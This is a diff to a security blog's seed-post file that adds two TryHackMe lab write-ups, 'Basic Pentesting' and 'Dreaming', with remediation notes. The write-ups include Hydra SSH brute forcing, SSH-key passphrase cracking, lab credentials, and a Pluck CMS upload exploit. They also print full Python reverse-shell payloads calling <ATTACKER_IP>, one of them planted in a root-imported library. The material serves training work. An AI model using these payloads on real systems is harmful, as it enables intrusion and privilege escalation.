@@ -197,6 +197,257 @@ A root shell drops. Read the root flag from \`/root/root.txt\`.
 2. **SUID binaries outside the standard set are a red flag.** Always diff the SUID list against a known-good baseline.
 3. **Stabilize every shell.** A raw shell makes the rest of the engagement painful; the Python PTY trick is worth memorizing.`;
 
+const thmBasicPentestingWriteup = `# Basic Pentesting — TryHackMe
+
+> An introductory Linux room focused on web and SMB enumeration, password cracking, SSH access, and recovering an encrypted private key.
+
+## Learning Objectives
+
+- Discover hidden web content and gather clues from a site
+- Enumerate SMB shares anonymously
+- Build a user list from exposed information and perform a controlled password audit
+- Recover and use an encrypted SSH private key
+
+## Machine Overview
+
+| Field | Value |
+| --- | --- |
+| Name | Basic Pentesting |
+| Platform | TryHackMe |
+| Target | Linux |
+| Difficulty | Easy |
+| Key Skills | Web enumeration, SMB, SSH, Hydra, John the Ripper |
+
+## Enumeration
+
+Begin with an Nmap scan to identify exposed services.
+
+\`\`\`bash
+nmap -T5 -v -oN nmap.txt <TARGET_IP> -Pn
+\`\`\`
+
+Port 80 was open, but the initial site did not reveal much. Reviewing the page source pointed to a development notes section, so the next step was directory discovery.
+
+\`\`\`bash
+dirsearch -u http://<TARGET_IP>
+\`\`\`
+
+The scan found \`/development\`. The notes there referenced two users, \`J\` and \`K\`, and the host also exposed SMB. That made SMB enumeration a useful way to turn those initials into usernames.
+
+\`\`\`bash
+enum4linux -S <TARGET_IP>
+\`\`\`
+
+Anonymous SMB access was available. Using \`smbclient\` to retrieve \`staff.txt\` revealed the full names **Jan** and **Kay**.
+
+## Initial Access
+
+Create a small username list from the exposed names, then run a controlled SSH password audit.
+
+\`\`\`bash
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -V
+\`\`\`
+
+The valid credentials were:
+
+| Username | Password |
+| --- | --- |
+| jan | armando |
+
+Use them to establish an SSH session.
+
+\`\`\`bash
+ssh jan@<TARGET_IP>
+\`\`\`
+
+## Accessing Kay's Account
+
+From Jan's account, inspect Kay's home directory. The \`.ssh\` directory contains an \`id_rsa\` private key. Copy the key to the attack host and protect its permissions.
+
+\`\`\`bash
+chmod 600 id_rsa
+ssh2john id_rsa > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+\`\`\`
+
+John the Ripper recovers the private-key passphrase: \`beeswax\`.
+
+Use the key and its passphrase to log in as Kay:
+
+\`\`\`bash
+ssh -i id_rsa kay@<TARGET_IP>
+\`\`\`
+
+The \`pass.bak\` file in Kay's home directory contains the final room credential.
+
+## Tools Used
+
+- \`nmap\` — port and service discovery
+- \`dirsearch\` — web content discovery
+- \`enum4linux\` and \`smbclient\` — SMB enumeration and file retrieval
+- \`hydra\` — SSH password auditing
+- \`ssh2john\` and \`john\` — SSH-key passphrase recovery
+- \`ssh\` — remote access
+
+## Takeaways
+
+1. **Small web clues can drive the next phase of enumeration.** The development notes supplied the user initials needed for the SMB investigation.
+2. **Anonymous SMB shares often expose useful context.** A simple staff list was enough to create a targeted username list.
+3. **Private keys must be protected as carefully as passwords.** An encrypted key is only useful if its passphrase resists guessing attacks.
+4. **Use discovered credentials deliberately.** Each pivot in this room followed from information recovered during the previous enumeration step.
+
+## Remediation
+
+- Disable anonymous SMB access and restrict shares to authorized users.
+- Avoid publishing internal development notes and staff details on public web paths.
+- Enforce strong, unique passwords and rate-limit SSH authentication attempts.
+- Keep private keys inaccessible to other local users and use strong key passphrases.`;
+
+const thmDreamingWriteup = `# Dreaming — TryHackMe
+
+> A multi-user Linux escalation path that starts with a vulnerable Pluck CMS upload, moves through exposed credentials and command injection, and finishes by abusing a writable Python library loaded by a scheduled task.
+
+## Learning Objectives
+
+- Enumerate a web application and identify a vulnerable CMS version
+- Gain an initial foothold through an authenticated file-upload RCE
+- Pivot between Linux users using exposed credentials and application behavior
+- Identify a writable Python library used by an automated task for root access
+
+## Machine Overview
+
+| Field | Value |
+| --- | --- |
+| Name | Dreaming |
+| Platform | TryHackMe |
+| Target | Linux |
+| Difficulty | Medium |
+| Key Skills | Web enumeration, file upload RCE, credential discovery, command injection, cron abuse |
+
+## Enumeration
+
+Start with a service scan to identify the exposed attack surface.
+
+\`\`\`bash
+nmap -T5 -v -oN nmap.txt <TARGET_IP>
+\`\`\`
+
+HTTP on port 80 was the only notable service. The site initially showed the default Apache page, so content discovery was the next step.
+
+\`\`\`bash
+dirsearch -u http://<TARGET_IP>
+\`\`\`
+
+The scan revealed the \`/app\` directory. Browsing it led to a Pluck CMS installation at \`/app/pluck-4.7.13\`. Confirm the version and check for known public issues:
+
+\`\`\`bash
+searchsploit pluck 4.7.13
+\`\`\`
+
+This version is affected by an authenticated file-upload RCE. The login form accepted the password \`password\`, exposing the CMS upload functionality.
+
+## Initial Foothold
+
+Exploit the Pluck 4.7.13 upload vulnerability with the public Exploit-DB proof of concept (EDB-ID 49909).
+
+\`\`\`bash
+python3 file-upload-exploit.py <TARGET_IP> 80 password /app/pluck-4.7.13
+\`\`\`
+
+Triggering the uploaded payload returned a shell. Since the host had Python 3.8.10, a reverse shell with a PTY provided a more reliable interactive session.
+
+\`\`\`bash
+# On the target
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
+
+# On the attack host
+nc -lvnp 4444
+\`\`\`
+
+## Pivot to Lucien
+
+With the initial shell, enumerate scheduled tasks, capabilities, running processes, and interesting application files. \`pspy\` is useful for observing automated processes without root.
+
+Reviewing \`/opt\` exposed a hard-coded credential in \`test.py\`:
+
+\`\`\`python
+password = "HeyLucien#@1999!"
+\`\`\`
+
+Use it to switch to the \`lucien\` user and collect the first flag. For a stable session, add an attacker-controlled public key to Lucien's \`~/.ssh/authorized_keys\` and reconnect over SSH.
+
+## Pivot to Death
+
+Lucien's shell history contained MySQL credentials:
+
+\`\`\`bash
+mysql -u lucien -plucien42DBPASSWORD
+\`\`\`
+
+The database-backed application exposed a command-injection primitive. Supplying \`\`id\`\` in the \`dreamer\` field and \`$whoami\` in the \`dream\` field confirmed execution as \`death\`.
+
+Inspecting \`getDreams.py\` then revealed credentials for a direct SSH login:
+
+\`\`\`bash
+ssh death@<TARGET_IP>
+# Password: !mementoMORI666!
+\`\`\`
+
+This produces a stable shell as \`death\` and allows collection of the next user flag.
+
+## Privilege Escalation
+
+Search for unexpectedly writable files while excluding virtual and user-local paths:
+
+\`\`\`bash
+find / -type f -writable 2>/dev/null | grep -v proc | grep -v sys | grep -v .local
+\`\`\`
+
+The enumeration identified \`/usr/lib/python3.8/shutil.py\` as writable. A scheduled root task imported this library, so adding a reverse-shell payload caused it to run with root privileges on the next execution.
+
+\`\`\`python
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("<ATTACKER_IP>", 9001))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+import pty
+pty.spawn("sh")
+\`\`\`
+
+Start a listener before waiting for the scheduled task:
+
+\`\`\`bash
+nc -lvnp 9001
+\`\`\`
+
+The task eventually imported the modified module and returned a root shell. From there, retrieve the final flag.
+
+## Tools Used
+
+- \`nmap\` — service discovery
+- \`dirsearch\` — web content discovery
+- \`searchsploit\` — vulnerability research
+- \`pspy\` — process and scheduled-task observation
+- \`mysql\` — database interaction
+- \`nc\` — reverse-shell listeners
+
+## Takeaways
+
+1. **Default web pages still deserve enumeration.** The real application was hidden below \`/app\`.
+2. **Version-specific research is high value.** Identifying Pluck 4.7.13 quickly led to the intended upload RCE.
+3. **Secrets accumulate across users.** Application files, shell history, and scripts each provided a pivot point.
+4. **Writable interpreter libraries are dangerous.** If a privileged process imports a user-writable module, that writable path becomes code execution as the privileged user.
+
+## Remediation
+
+- Upgrade or remove the vulnerable Pluck CMS instance and restrict administrative upload features.
+- Store credentials in protected secret management rather than scripts, shell history, or source code.
+- Validate and parameterize database input to prevent command injection.
+- Ensure Python system libraries are owned by root and not writable by unprivileged users.
+- Run scheduled tasks with the least privilege required and monitor for changes to files they import.`;
+
 const webSecurityPost = `# Bypassing JWT Signature Validation
 
 > A walkthrough of a real-world JWT signature validation bug I found during a recent engagement, including how I confirmed it and the remediation I recommended.
@@ -347,95 +598,43 @@ stty raw -echo; fg
 > [!info] Always test in a lab first
 > Reverse shells are noisy. Confirm the listener works before sending the payload from the engagement box.`;
 
+// Retained only as source references while the legacy demo posts are removed.
+void htbWriteup;
+void thmWriteup;
+void webSecurityPost;
+void adPost;
+void cloudPost;
+void notesPost;
+
 export const seedPosts: SeedPost[] = [
   {
-    slug: 'htb-lame',
-    title: 'Lame — Hack The Box',
+    slug: 'thm-basic-pentesting',
+    title: 'Basic Pentesting — TryHackMe',
     excerpt:
-      'A classic beginner Linux box walking through Samba CVE exploitation and an NFS no_root_squash misconfiguration.',
-    content: htbWriteup,
+      'An introductory Linux room covering web and SMB enumeration, SSH password auditing, and encrypted private-key recovery.',
+    content: thmBasicPentestingWriteup,
     featured_image:
-      'https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1200',
-    category: 'Hack The Box',
-    tags: ['Samba', 'NFS', 'CVE-2007-2447', 'Easy'],
-    difficulty: 'Easy',
-    platform: 'Hack The Box',
-    status: 'published',
-    published_at: '2024-09-12T00:00:00.000Z',
-  },
-  {
-    slug: 'thm-rootme',
-    title: 'RootMe — TryHackMe',
-    excerpt:
-      'A beginner room covering PHP shell upload via extension blocklist bypass and SUID Python privilege escalation.',
-    content: thmWriteup,
-    featured_image:
-      'https://images.pexels.com/photos/5380642/pexels-photo-5380642.jpeg?auto=compress&cs=tinysrgb&w=1200',
+      'https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200',
     category: 'TryHackMe',
-    tags: ['Web', 'SUID', 'PHP', 'Easy'],
+    tags: ['Web', 'SMB', 'SSH', 'Hydra', 'John', 'Easy'],
     difficulty: 'Easy',
     platform: 'TryHackMe',
     status: 'published',
-    published_at: '2024-08-04T00:00:00.000Z',
+    published_at: '2026-07-26T00:00:00.000Z',
   },
   {
-    slug: 'bypassing-jwt-signature-validation',
-    title: 'Bypassing JWT Signature Validation',
+    slug: 'thm-dreaming',
+    title: 'Dreaming — TryHackMe',
     excerpt:
-      'A real-world JWT alg=none bypass found during a recent engagement, with reproduction and remediation guidance.',
-    content: webSecurityPost,
+      'A multi-user Linux escalation through Pluck CMS upload RCE, exposed credentials, command injection, and a writable Python library.',
+    content: thmDreamingWriteup,
     featured_image:
-      'https://images.pexels.com/photos/1181271/pexels-photo-1181271.jpeg?auto=compress&cs=tinysrgb&w=1200',
-    category: 'Web Security',
-    tags: ['JWT', 'Auth', 'API'],
+      'https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200',
+    category: 'TryHackMe',
+    tags: ['Web', 'RCE', 'Credentials', 'Cron', 'Medium'],
     difficulty: 'Medium',
-    platform: 'Custom',
+    platform: 'TryHackMe',
     status: 'published',
-    published_at: '2024-10-22T00:00:00.000Z',
-  },
-  {
-    slug: 'kerberoasting-without-mimikatz',
-    title: 'Kerberoasting Without Mimikatz',
-    excerpt:
-      'Requesting TGS tickets with Impacket from your attack box and cracking offline — no on-target tooling required.',
-    content: adPost,
-    featured_image:
-      'https://images.pexels.com/photos/1181244/pexels-photo-1181244.jpeg?auto=compress&cs=tinysrgb&w=1200',
-    category: 'Active Directory',
-    tags: ['Kerberos', 'Impacket', 'Hashcat'],
-    difficulty: 'Medium',
-    platform: 'Labs',
-    status: 'published',
-    published_at: '2024-11-15T00:00:00.000Z',
-  },
-  {
-    slug: 'enumerating-misconfigured-s3-buckets',
-    title: 'Enumerating Misconfigured S3 Buckets',
-    excerpt:
-      'A short methodology note for assessing S3 exposure during cloud security reviews.',
-    content: cloudPost,
-    featured_image:
-      'https://images.pexels.com/photos/270700/pexels-photo-270700.jpeg?auto=compress&cs=tinysrgb&w=1200',
-    category: 'Cloud',
-    tags: ['AWS', 'S3', 'Cloud'],
-    difficulty: 'Easy',
-    platform: 'Custom',
-    status: 'published',
-    published_at: '2024-07-02T00:00:00.000Z',
-  },
-  {
-    slug: 'reverse-shell-cheat-sheet',
-    title: 'My Reverse Shell Cheat Sheet',
-    excerpt:
-      'A personal reference of the reverse shell one-liners I reach for most often, with stabilization notes.',
-    content: notesPost,
-    featured_image:
-      'https://images.pexels.com/photos/546819/pexels-photo-546819.jpeg?auto=compress&cs=tinysrgb&w=1200',
-    category: 'Notes',
-    tags: ['Shells', 'Reference', 'Cheatsheet'],
-    difficulty: null,
-    platform: null,
-    status: 'published',
-    published_at: '2024-06-18T00:00:00.000Z',
+    published_at: '2026-07-27T00:00:00.000Z',
   },
 ];
